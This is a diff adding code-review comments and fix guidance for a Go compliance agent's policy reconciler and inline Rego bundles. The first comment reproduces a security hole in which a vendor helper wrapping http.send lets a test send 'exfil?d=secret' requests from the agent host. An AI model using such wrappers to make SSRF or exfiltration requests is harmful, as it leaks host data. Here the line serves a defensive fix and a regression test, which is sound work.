@@ -1,0 +1,139 @@
+lisa-addressed:
+---
+Comment (internal/inlinepolicy/check.go:90):
+Blocking: a denied builtin that `deniedReachable` has just flagged is still executed on the agent host. `runTests` runs even when step 2 found hits.
+
+I reproduced this against b9c1cad with the fixture from `TestCheck_CompileAndBuiltins`. The vendor tree has `lib/net.rego: fetch(u) := http.send({"method":"GET","url":u})`. The authored `x_test.rego` is `test_x if { net.fetch("http://127.0.0.1:<port>/exfil?d=secret") }`. `Check` returns the expected `forbidden builtin http.send is reachable from authored rule ...` error, but a local `httptest` server records `GET /exfil?d=secret` during the same `Check` call. `regocheck` doesn't catch this at parse level, because the authored module never names `http.send` directly. So under `apply_safe` (inline bundles are safe), a `configure-policy` author or a compromised API can make the agent issue arbitrary HTTP requests from the host (SSRF, cloud metadata, exfil) through any vendor helper that wraps `http.send`. The revision is rejected afterwards, but the request has already gone out. This is the D17/§8 boundary ("the agent enforces forbidden builtins **before running any inline module**").
+
+Suggested fix, pick either or both:
+- Return before `runTests` when `deniedReachable` finds any hit, since the revision is rejected anyway.
+- Belt and braces: run the tester with a compiler restricted to `policyeval.SandboxCapabilities()`, or at least make `http.send` and `net.lookup_ip_addr` unavailable at eval time.
+
+Please add a regression test: an httptest server that must see zero requests.
+Replies:
+**lisa implementation guidance:** Fix (inlinepolicy.Check): return BEFORE runTests when deniedReachable reports any hit. Defence in depth: runTests compiles copies of the modules with policyeval.SandboxCapabilities() after rewriting every DeniedBuiltins ref to an agent-owned stub builtin that always errors, so a denied builtin can never execute during tests (vendor modules that only reference it off the authored path still compile; their tests just fail as warnings). Regression tests: httptest probe must see zero requests for (a) the reviewer's authored _test.rego via vendor net.fetch and (b) a vendor test calling http.send.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/config.go:287):
+Blocking (R34/R51, "no breaking changes"): the shared `Validate` now makes some **file** configs fatal at startup that load fine on `main`. Only `/plugins/*/schedule` is tolerated, so everything else file-origin is fatal. I probed `loadBase` on b9c1cad:
+- `verbosity: -1` → `/verbosity: must not be negative`. On `main` this was accepted, and it is meaningful: `hclog.Info - (-1)` = Warn, i.e. a quieter agent.
+- A literal `${env:TEAM}` in `plugins.*.labels` or `plugins.*.policy_data` → `${env:...} references are only resolved in plugins.*.config values`. On `main` it was an opaque string passed to the plugin or Rego.
+
+The git note says this follows the LLD's "new-feature rules are not in T". But these values aren't new-feature config: they are existing keys whose existing values are now rejected. R34 and R51 say file-origin values keep today's behaviour and must never become fatal.
+
+Suggested fix: add a "warn, don't skip" class next to `toleratedFileRules`, e.g. `/verbosity` and `FieldCodeEnvLocation` outside `plugins.*.config`, when the error is file-origin. Report these as `warnings` and keep the value unchanged: no plugin skip, and the placeholder stays unresolved as today. Overlay-origin errors stay strict. The current `partitionByOrigin` would *skip the plugin* for any tolerated `/plugins/<p>/…` path, so the env-location case needs a non-skipping variant. Please add a table test next to `TestLoadBase_BadFileScheduleIsTolerated`.
+Replies:
+**lisa implementation guidance:** Fix (owner override of the earlier design note): partitionByOrigin gains a warn-only file-origin class: /verbosity (negative = quieter, as on main) and FieldCodeEnvLocation outside /policy_bundles. These become warnings with NO plugin skip and the value unchanged; overlay-origin stays strict. logWarnings wording must not claim a skip for them. Table test next to TestLoadBase_BadFileScheduleIsTolerated + an overlay-origin strictness case.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler.go:787):
+Blocking: when a new revision produces the same effective config (e.g. rev 2 adds `verbosity: 0` equal to the base, or re-sets a value to the file's value), this branch returns without recording that the new overlay is now the active one. `candidateIdentity` hashes only the declared config and inline dirs, not the overlay's ETag or revision. The consequences:
+- `rc.active.overlay` stays at the old revision, so `sameAsActive` is false on **every** poll. Each poll re-runs the full `prepare`: Prefetch, and for inline bundles materialize plus OPA compile and tests.
+- The report, heartbeat `config_revision` and evidence prop keep saying the old `applied-revision`, while `cache.Applied` says the new one. The API derives `pending` forever for that instance.
+
+I confirmed this with a probe on the remote harness. After publishing a no-op rev 2, 3 polls give 3 Prefetch calls, and the last report still has `applied-revision: 1`.
+
+Suggested fix: either include `(overlay.ETag, overlay.Revision)` in the identity (a restart for a no-op revision is acceptable), or on an identity match update the active candidate's `overlay` and `runtime.sync.AppliedRevision` in place without a restart. `sync` is read by the heartbeat and evidence, so it needs the mutex or a swap.
+Replies:
+**lisa implementation guidance:** Fix: on an identity match, adopt the new candidate in place without a restart: keep the running runtime pointer, update its sync metadata atomically (syncMeta behind an atomic pointer so heartbeat/evidence see the new applied revision), and replace rc.active/rc.pending with a candidate carrying the new base/overlay so sameAsActive holds on the next poll (also fixes comment-only file edits). run() must take 'previous' from rc.active (the adopted record). Test: no-op rev 2 -> 3 polls -> 1 Prefetch, report applied-revision 2, heartbeat sync revision 2, no swap.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler.go:813):
+Blocking (§5.4 "Rejected revisions are remembered, so a bad overlay is not re-attempted every minute"): this is the unfixed self-review finding, and I confirm it. Say a file edit makes the currently applied overlay invalid for the new base (a flag removed from `overridable_config_flags`, or `policy_data` that now fails an authored test). Then `Fetched` is remembered-rejected, but this fallback returns `cache.Applied`, which is the *same* record, and it isn't checked against `rememberedRejected`. `sameAsActive` is false because the base bytes changed, so every poll re-runs `prepare` against the new base. For `unsafe-changes` that's cheap, but for `policy-errors` it re-materializes and re-runs OPA compile and tests (up to 30s) every poll.
+
+Suggested fix (as the note proposes): in `reconcile`, after picking `target`, `if target != nil && rc.rememberedRejected(target) { rc.maybeReport(ctx, active, rc.lastOutcome); return }`. That keeps last-known-good per G3.4. Or apply the same check to `cache.Applied` inside `targetOverlay`. Please add a test that counts `prepare` or materialize calls across polls in this state.
+Replies:
+**lisa implementation guidance:** Fix: in reconcile after targetOverlay, if target != nil && rc.rememberedRejected(target) { maybeReport(active, lastOutcome); return } (keep last-known-good). Test counts prepare calls across polls after a conflicting file edit.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/agent.go:1105):
+Blocking (R33: "SIGTERM keeps its 30s"): during a reload drain, this branch waits up to `reloadDrainTimeout` (5m) without reading `sigs`. `signal.Notify` has disabled the default SIGTERM action. After the drain, `defer signal.Stop(sigs)` discards the buffered signal. So a SIGTERM (`systemctl stop`, a pod eviction) that arrives while a reload is draining is **lost**, not delayed. The agent keeps running on the new config until SIGKILL (systemd `TimeoutStopSec`, the k8s grace period), and plugin children may be left behind.
+
+This was already latent on `main` with the 30s drain. The 5-minute drain turns it into a realistic window.
+
+Suggested fix: pass `sigs` into the drain wait, e.g. a `select` over the cron stop, `time.After(reloadDrainTimeout)` and `<-sigs`. On a signal, switch to the SIGTERM path: `daemonCronStopTimeout`, `closePluginClients`, `os.Exit(0)`. A small test with an injected signal channel would pin it.
+Replies:
+**lisa implementation guidance:** Fix: the reload drain select also reads sigs (waitForDrain helper returning the signal). On a signal: wait the remaining daemonCronStopTimeout (30s), closePluginClients, exit(0). Add seams for signal registration and exit so a test can inject SIGTERM mid-drain and assert exit(0) happens promptly.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler.go:340):
+Blocking (behaviour regression, "no breaking changes"): on `main`, a plugin or policy download failure at startup went through `Run` and called `sendAgentRunEvidenceOnStartupFailure` (agent evidence enabled with `emit_on_run_completion`, which is the default) before exiting 1. That is how CCF learns that an agent failed to start. Now the file-only rung's `Prefetch` failure returns here, `agentRunner` exits 1, and `Run` never executes, so that evidence is never sent. `markPluginsWithSourceFailed` and `markPluginsWithPolicyFailed` never run either, so even a later send would lack the failure details.
+
+Suggested fix: when the last (file-only) rung fails with `download-failed`, fall through to `Run` with the file-only runtime, as `main` did, so the existing failure-evidence path fires. Or explicitly `UpdateConfig` and send the startup-failure evidence before returning. The exit code stays 1. Please add a test that asserts the startup-failure evidence is sent.
+Replies:
+**lisa implementation guidance:** Fix: Prefetch returns a typed download error (plugin vs policy source). prepare attaches the built runtime to the download-failed applyError; startup, when the file-only rung fails with download-failed, calls an onStartupFailure hook (wired to AgentRunner) that UpdateConfig()s the runtime, marks the plugins with the failed source/policy (markPluginsWith*Failed) and sends sendAgentRunEvidenceOnStartupFailure before returning (exit 1 unchanged). Test asserts the evidence is sent with the failure.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler.go:392):
+Non-blocking: rejected-revision memory (and `inFailedBackoff`) match on ETag alone. If a response ever arrives without an `ETag` header (a stripping proxy, or an API bug), every revision has `ETag == ""`. One rejection then blocks all later revisions until the base changes. I confirmed this in a probe: an unsafe rev 1, then a safe rev 2, both with an empty ETag → rev 2 is never applied. `sameOverlay` already falls back to revision plus bytes when the ETag is empty. Suggest the same fallback here, i.e. key on `(revision, sha256(overlay))` when `ETag == ""`.
+Replies:
+**lisa implementation guidance:** Fix: key the rejected memory and failed backoff on overlayKey(rec): the ETag when set, else revision + sha256(overlay). RejectedRecord gains overlay_sha256 (omitempty, cache stays compatible). Test: empty ETag, unsafe rev 1 then safe rev 2 -> rev 2 applies.
+
+<!-- lisa-guidance-posted -->
+**lisa implementation guidance:** Fix: key the rejected memory and failed backoff on overlayKey(rec): the ETag when set, else revision + sha256(overlay). RejectedRecord gains overlay_sha256 (omitempty, cache stays compatible). Test: empty ETag, unsafe rev 1 then safe rev 2 -> rev 2 applies.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler.go:659):
+Non-blocking, two small issues around run failure:
+1. **Ordering race:** `notifyRunFailed(active)` fires before `bind(previous)`. If `onRunFailed` runs first, `rc.current()` still returns the *failed* candidate. `cache.Applied` is then "reverted" to the failed overlay and the failure report describes the wrong candidate. Suggest sending `(failed, previous)` in the message, or binding before notifying.
+2. **File-only failures have no backoff:** when `c.overlay == nil`, nothing records the failure. Say a file edit prepares fine but fails in `Run` (e.g. a cron setup error). Every poll then re-prepares the new base, which isn't `sameAsActive`, and swaps. That cancels the healthy config, drains for up to 5 min, fails, and falls back. So the agent flaps each poll. Suggest a base-fingerprint-keyed backoff for file-only run failures, like the overlay path.
+Replies:
+**lisa implementation guidance:** Fix both: (1) run() binds the fallback candidate before notifying onRunFailed, so rc.current() is the fallback. (2) failed backoff also covers file-only candidates (key 'file-only' + base fingerprint), started by onRunFailed and by a failed file-only prepare; reconcile checks inFailedBackoff(nil) too. Tests for both.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (internal/inlinepolicy/materialize.go:251):
+Non-blocking: `WalkDir` doesn't follow a symlinked **root**. If a local `extends` (or the resolved policy root) is itself a symlink, e.g. `/etc/ccf/policies` → a versioned dir, or a k8s ConfigMap mount whose files are `..data/*` links, the vendor tree comes back empty or with odd `..2024_…/` paths. It is reported only as a warning, and the materialized bundle silently loses the vendor policies. Suggest `filepath.EvalSymlinks(dir)` on the root before walking, and possibly following in-tree symlinks whose target stays under the resolved root. Keep skipping the ones that escape it.
+Replies:
+**lisa implementation guidance:** Fix (cheap part): readTree resolves the root with filepath.EvalSymlinks before walking; Materialize returns ErrResolve (download-failed, retried with backoff) when an extends tree has no .rego file. In-tree symlinks stay skipped (warning). Tests: symlinked extends root, empty extends tree.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/inline.go:187):
+Non-blocking: GC runs only at startup, and `Materialize` writes the directory before `Check`, so rejected content also lands on disk. A long-running daemon accumulates one directory per distinct revision or bundle content (up to 1 MiB each) until it restarts. The design allows "GC on start", but a GC after each successful swap, keeping the active and pending dirs plus the newest N, would bound it cheaply.
+Replies:
+**lisa implementation guidance:** Fix: run inline GC after every successful swap, keeping the dirs of the running and the pending candidate plus the newest inlineGCKeepPerBundle per bundle (shared helper with the startup GC).
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/config.go:196):
+Non-blocking (a tiny compatibility edge): every YAML config now goes through `sigs.k8s.io/yaml.YAMLToJSON`, even when it has no `policy_bundles`. YAML that viper accepts but JSON can't represent now fails startup. For example, `.nan` or `.inf` anywhere in the file, e.g. in `policy_data`, gives `decode policy_bundles: json: unsupported value: NaN`, which I confirmed. Suggest decoding only when the key is present (`v.IsSet("policy_bundles")` or a cheap top-level key check), so files without bundles take exactly `main`'s path. I also checked the known `policy_bundles: null` concern: viper's `IsSet` is false for null in YAML and JSON, so that case loads fine.
+Replies:
+**lisa implementation guidance:** Fix: only decode policy_bundles outside viper when v.IsSet("policy_bundles"); the unsupported-format error only for extensions other than yaml/yml/json/toml. Test: a YAML file with .nan in policy_data and no policy_bundles loads.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler_test.go:241):
+Non-blocking (test strength): this returns on the first started config with `*/5`, but half of the 50 writes are `*/5`. An intermediate reload satisfies it, so it doesn't prove the last write wins. Suggest making the last write unique, e.g. `*/9`, and asserting that the *final* started config (after quiescence) has it. Similarly, `TestReconciler_RaceInterleavedFileEventsAndPolls` (`remote_test.go:797`) never stops the `rc.run` goroutine, which leaks across tests. Return from the run func on a test-owned done channel and wait on `done`.
+Replies:
+**lisa implementation guidance:** Fix: RapidFileEventsRace makes the last write unique (*/9) and asserts the final running config after quiescence; RaceInterleavedFileEventsAndPolls returns from the run func on a test-owned stop channel and waits on done.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/agent.go:1249):
+Non-blocking: with `WithoutCancel`, a job still running when the 5-minute drain times out keeps going after `runDaemon` returns. It then reads `ar.getConfig()`, `getAPIClient()` and `getLogger()` of the **new** config mid-run, while `closePluginClients` kills its plugin. It's benign in practice, but capturing the config, client and logger once per job (at `setupCron` time) would make old runs self-consistent.
+Replies:
+**lisa implementation guidance:** Fix: setupCron snapshots config, API client and logger once and the default job runs runPluginWith(snapshot), so a draining job never reads the next config's state.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler.go:506):
+Non-blocking: `Prefetch` (and `extends` resolution) runs on the reconciler goroutine with the root context and no deadline. A registry that hangs, rather than failing, stalls the whole reconciler: no file reloads, polls or reports until it returns. Before this PR a hung download only blocked that `Run`. Suggest bounding prepare's network phase, e.g. `context.WithTimeout(ctx, <few minutes>)`, and mapping a timeout to `failed/download-failed`, which already gets the backoff.
+Replies:
+**lisa implementation guidance:** Fix: bound prepare's network phase: Prefetch and every resolvePolicy call (extends + report inventory) get context.WithTimeout(prepareNetworkTimeout = 5m); a timeout surfaces as failed/download-failed (existing backoff). Test with a hanging prefetcher.
+
+<!-- lisa-guidance-posted -->
+---
+Comment (cmd/reconciler.go:491):
+Non-blocking (question, needs an owner decision): R24 resolves `${env:NAME}` in **file** `plugins.*.config` values too. With `NAME` unset, the file-only rung fails with `failed/env-missing`, and at startup that means exit 1. On `main`, a literal `${env:NAME}` was passed to the plugin verbatim. That is unlikely in real configs, but in the spirit of R34 do we want a file-origin missing variable to be a warning (skip the plugin, report it) rather than fatal? Leaving it as designed is fine if that's the call. Please just record it in the ADR.
+Replies:
+**lisa implementation guidance:** Fix per owner decision R60 (design §12): a file-origin unset ${env:X} in plugins.*.config is a warning (Report.warnings, code env-missing) and the literal value is passed to the plugin unchanged, exactly as on main. 'File-origin' is per (pointer, variable): the base value at that pointer references X. Overlay-introduced unset variables keep failing with failed/env-missing. Record in ADR 0003 + a design note.
+
+<!-- lisa-guidance-posted -->
